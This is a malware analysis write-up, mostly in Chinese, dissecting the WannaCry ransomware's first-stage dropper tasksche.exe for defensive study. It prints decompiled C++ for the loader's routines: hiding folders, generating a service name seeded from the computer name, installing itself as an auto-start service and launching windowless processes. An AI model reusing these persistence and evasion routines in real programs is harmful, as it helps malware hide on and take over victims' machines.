# Wannacry in-depth analysis #

The WannaCry ransomware attack is an ongoing worldwide cyberattack by the WannaCry ransomware cryptoworm, which targets computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in the Bitcoin cryptocurrency.

The attack started on Friday, 12 May 2017, and within a day was reported to have infected more than 230,000 computers in over 150 countries. Parts of Britain's National Health Service (NHS), Spain's Telefónica, FedEx and Deutsche Bahn were hit, along with many other countries and companies worldwide.

作为一名安全行业工作者，我对WannaCry进行了深度的分析。 完整的分析可以帮助安全行业工作者了解黑客的的最新攻击手段，为防护领域的解决方案提供有价值的信息，更进一步尝试发现软件弱点，为客户提供有价值的数据恢复服务。

下面我将开始对我这2天分析的结果做一个全面的回顾。

我之前对CryptXXX，Cerber以及Locky这几种高热点勒索软件进行过深入分析，Wannacry这款勒索软件显然吸取了之前勒索软件的设计经验，并进化升级出了一个二阶段攻击方法。 什么是二阶段攻击呢？简单来讲，就是恶意程序本身并没有攻击行为，比如Wannacry程序自身并不做数据加密的工作，它会将真正具有攻击行为的代码动态释放出来，将数据加密的行为隐藏到释放出来的代码中。 这听起来很想壳的行为，比如Locky就是一款带壳的勒索软件，它运行起来后会通过壳代码释放恶意代码。 但壳代码本身也是一个很明显的特征，比如加过壳的代码无法进行反汇编，并且一般情况下信息熵很高，很多防护软件会对这种程序提高危险等级，用户一旦碰到，或者这种程序一旦Drop到用户的机器上就会被Detect到。 但是Wannacry不同，它的第一阶段程序完全没有任何壳代码，EntryPoint也没有做任何的定制，没有任何认为修改的痕迹，也许这也是Wannacry会在利用微软漏洞大规模被传播到Endpoint上没有被发现的原因吧。


**tasksche** 

Wannacry的主程序会被修改会**tasksche.exe**，起这个名字的目的是为了迷惑用户。 下面我们来一起来分析一下这个程序，从WinMain函数开始。


> 为了容易说明程序的行为，以下的代码片段将全部使用C++语言来表述，除非碰到C++表达混乱或者因编译器优化等原因导致C++无法表达的情况下，会采用汇编语言并加详细说明。

```C++
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char **argv; 
  void *lpPEFile; 
  CPeBuilder *pPeBuilder; 
  void (__stdcall *fpTaskStart)(_DWORD, _DWORD); 
  CProgram Program; 
  char szModuleFileName[520]; 
  int nFileSize; 

  szModuleFileName[0] = szSelfName;
  memset(&szModuleFileName[1], 0, 516u);
  *&szModuleFileName[517] = 0;
  szModuleFileName[519] = 0;
  GetModuleFileNameA(0, szModuleFileName, 520u);
  CreateRandomSequence(szServiceName);
  if ( *_p___argc() != 2
    || (argv = _p___argv(), strcmp(*(*argv + 1), aI))
    || !CreateHiddenData(0)
    || (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
    || !StartMalware() )
  {
    if ( strrchr(szModuleFileName, '\\') )
      *strrchr(szModuleFileName, '\\') = 0;
    SetCurrentDirectoryA(szModuleFileName);
    WriteRegistery(1);
    ExtractFromResource(0, WNcry);
    ModifyOneByte();
    StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
    StartProcess(aIcacls_GrantEv, 0, 0);
    if ( InitKernel32Funcs() )
    {
      CProgram::ctor(&Program);
      if ( CProgram::Initialize(&Program, 0, 0, 0) )
      {
        nFileSize = 0;
        lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
        if ( lpPEFile )
        {
          pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
          if ( pPeBuilder )
          {
            fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
            if ( fpTaskStart )
              fpTaskStart(0, 0);
          }
        }
      }
      CProgram::dtor_0(&Program);
    }
  }
  return 0;
}
```

WinMain的代码很容易理解，声明了几个变量，其中CProgram对象，CPeBuilder指针，以及fpTaskStart是整个WinMain运行的关键，WinMain的目的是动态加载一个Pe dll到内存中并运行起来，整个过程做的相当的隐蔽。 WinMain函数在栈上声明了一个520 byte的数组，用来获取当前进程的完整路径，程序会利用这个路径将文件复制一份并命名为tasksche.exe，并调用StartMalware启动自己。

在这里Malware已经通过漏洞进入Endpoint中并且被launch起来了，我认为这里存在一个common的阶段，我把这个阶段定义为**隐藏阶段**。何为隐藏阶段，换句话说在这个阶段Malware首先要做的不是执行攻击代码，而是在实施攻击之前首先隐匿自己的行踪，伪装自己为一个看起来正常的程序，并在日后的日志调查中迷惑分析人员。

```C++
if ( *_p___argc() != 2
|| (argv = _p___argv(), strcmp(*(*argv + 1), aI))
|| !CreateHiddenData(0)
|| (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
|| !StartMalware() )
```

仔细看一下这段代码，Wannacry启动后的第一时间进行了几个关键操作：

- 检查启动参数
- 创建隐藏数据(folder)
- 重命名为tasksche.exe
- 再次启动自己

检查启动参数与重命名可以直接从表达式中判断出来，不复杂。

**创建隐藏数据**

```C++
int __cdecl CreateHiddenData(wchar_t *p)
{
  int result; 
  __int16 wszWindowsPath[260]; 
  __int16 wszProgramData[260];
  __int16 wszServiceName[100];

  wszWindowsPath[0] = g_ComputerName;
  memset(&wszWindowsPath[1], 0, 516u);
  wszWindowsPath[259] = 0;
  wszProgramData[0] = g_ComputerName;
  memset(&wszProgramData[1], 0, 516u);
  wszProgramData[259] = 0;
  wszServiceName[0] = g_ComputerName;
  memset(&wszServiceName[1], 0, 196u);
  wszServiceName[99] = 0;
  MultiByteToWideChar(0, 0, szServiceName, -1, wszServiceName, 99);
  GetWindowsDirectoryW(wszWindowsPath, 260u);
  wszWindowsPath[2] = 0;
  swprintf(wszProgramData, aSProgramdata, wszWindowsPath);
  if ( GetFileAttributesW(wszProgramData) != INVALID_FILE_ATTRIBUTES && CreateFolder(wszProgramData, wszServiceName, p)
    || (swprintf(wszProgramData, aSIntel, wszWindowsPath), CreateFolder(wszProgramData, wszServiceName, p))
    || CreateFolder(wszWindowsPath, wszServiceName, p) )
  {
    result = 1;
  }
  else
  {
    GetTempPathW(260u, wszProgramData);
    if ( wcsrchr(wszProgramData, '\\') )
      *wcsrchr(wszProgramData, '\\') = 0;
    result = CreateFolder(wszProgramData, wszServiceName, p) != 0;
  }
  return result;
}
```

上面的函数最终创建了**%WinDir%\ProgramData，%WinDir%\Intel**两个folder并将其属性设置为Hidden。

```C++
int __cdecl CreateFolder(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *String)
{
  int result; 
  DWORD fac; 

  CreateDirectoryW(lpPathName, 0);
  if ( SetCurrentDirectoryW(lpPathName) && (CreateDirectoryW(lpFileName, 0), SetCurrentDirectoryW(lpFileName)) )
  {
    fac = GetFileAttributesW(lpFileName);
    LOBYTE(fac) = fac | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN;  <<==== Note here.
    SetFileAttributesW(lpFileName, fac);
    if ( String )
      swprintf(String, aSS, lpPathName, lpFileName);
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}
```

上面是CreateFolder的代码，很容易理解，主要是对通过此函数创建的Folder设置Hidden属性。

**再次启动自己**

```C++
BOOL StartMalware()
{
  char szFullPath[520];

  szFullPath[0] = szSelfName;
  memset(&szFullPath[1], 0, 516u);
  *&szFullPath[517] = 0;
  szFullPath[519] = 0;
  GetFullPathNameA(FileName, 520u, szFullPath, 0);
  return StartService(szFullPath) && WaitMutex4Times(60) || StartProcess(szFullPath, 0, 0) && WaitMutex4Times(60);
}
```

注意最后一行的代码，Wannacry会用2中种方式再次启动自己，首先尝试将自己伪装成服务程序，如果失败了，在尝试通用的进程方式。

*服务方式*

在利用服务方式启动的时候，Wannacry首先会利用在WinMain中初始化的一个随机序列作为服务名称。 下面是生成随机序列的代码：

```C++
int __cdecl CreateRandomSequence(char *displayname)
{
  unsigned int nSeed; 
  int pBuffer; 
  size_t nLen; 
  int index;
  int v5;
  int v6; 
  int result; 
  __int16 Buffer[200]; 
  DWORD nSize; 
  unsigned int i; 

  Buffer[0] = g_ComputerName;
  nSize = 399;
  memset(&Buffer[1], 0, 396u);
  Buffer[199] = 0;
  GetComputerNameW(Buffer, &nSize);
  i = 0;
  nSeed = 1;
  if ( wcslen(Buffer) )
  {
    pBuffer = Buffer;
    do
    {
      nSeed *= *pBuffer;
      ++i;
      pBuffer += 2;
      nLen = wcslen(Buffer);
    }
    while ( i < nLen );
  }
  srand(nSeed);
  index = 0;
  v5 = rand() % 8 + 8;
  if ( v5 > 0 )
  {
    do
      displayname[index++] = rand() % 26 + 'a';
    while ( index < v5 );
  }
  v6 = v5 + 3;
  while ( index < v6 )
    displayname[index++] = rand() % 10 + '0';
  result = displayname;
  displayname[index] = 0;
  return result;
}
```

这段代码利用了用户的计算机名称，通过对计算机名称的每一个自己进行乘法溢出运算，会得到一个初始化随机发生器的种子值，并利用随机数发生器来生成随机的服务名称。 这个随机的服务名称由'a-z''0-9'组成。

```C++
signed int __cdecl StartService(char *pFullpath)
{
  signed int result; 
  SC_HANDLE hSCService; 
  char lpBinaryPathName; 
  SC_HANDLE hSCObject; 
  int nRet; 
  SC_HANDLE hSCManager; 

  nRet = 0;
  hSCManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS);
  if ( hSCManager )
  {
    hSCObject = OpenServiceA(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
    if ( hSCObject )
    {
      StartServiceA(hSCObject, 0, 0);
      CloseServiceHandle(hSCObject);
      result = 1;
    }
    else
    {
      sprintf(&lpBinaryPathName, Format, pFullpath);// cmd.exe /c "%s"
      hSCService = CreateServiceA(
                     hSCManager,
                     szServiceName,
                     szServiceName,
                     SERVICE_ALL_ACCESS,
                     SERVICE_WIN32_OWN_PROCESS,
                     SERVICE_AUTO_START,
                     SERVICE_ERROR_NORMAL,
                     &lpBinaryPathName,
                     0,
                     0,
                     0,
                     0,
                     0);
      if ( hSCService )
      {
        StartServiceA(hSCService, 0, 0);
        CloseServiceHandle(hSCService);
        nRet = 1;
      }
      result = nRet;
    }
    CloseServiceHandle(hSCManager);
  }
  else
  {
    result = 0;
  }
  return result;
}
```

Wannacry利用StartService函数将自身作为一个带有随机服务名称的服务进行启动，这是最容易掩人耳目的隐蔽手段。 但是如果没有权限操作服务管理器，或者意外失败了，Wannacry还有常规启动方法作为备选。

```C++
int __cdecl StartProcess(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
{
  int result; 
  struct _STARTUPINFOA StartupInfo;
  struct _PROCESS_INFORMATION ProcessInformation; 

  StartupInfo.cb = 0x44;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hProcess = 0;
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 1;
  if ( CreateProcessA(0, lpCommandLine, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &StartupInfo, &ProcessInformation) )  <<=== Note here 
  {
    if ( dwMilliseconds )
    {
      if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
        TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
      if ( lpExitCode )
        GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
    }
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}
```

StartProcess函数作为备选使用常规方式启动一个进程，这里被传入的CommandLine就是已经被改过名称为tasksche.exe的程序路径了，至少用这个名称这也有一些迷惑作用,并且一个小细节，设置了非窗口模式。






